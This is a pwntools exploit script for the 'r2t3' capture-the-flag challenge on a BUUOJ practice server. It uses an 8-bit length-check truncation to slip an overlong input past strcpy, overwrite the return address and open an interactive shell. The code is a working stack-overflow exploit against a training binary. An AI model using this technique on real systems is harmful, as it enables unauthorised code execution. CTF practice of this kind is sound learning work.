from pwn import *
context.arch = 'i386'

# there is a strcpy in name_check, it's misguide,
# at the first we may try to make stack overflow by strcpy,
# but it doesn't work,we can find it calculate the lenght of str by al,
# in other words,as long as we input more than 255 characters,
# we can pss the judge(v3 = strlen(s);if ( v3 <= 3u || v3 > 8u )),
# and make stack over flow

# p = process('./r2t3')
p = remote('node3.buuoj.cn',27733)

payload = 'A'*0x15 + p32(0x0804858B) # the offset when we debug could find it
payload = payload.ljust(0x104,'B')	# padding,and make al betwwen 3 and 8
p.recvuntil("[+]Please input your name:")
p.send(payload)
p.recvuntil("Hello,My dear")
p.interactive()
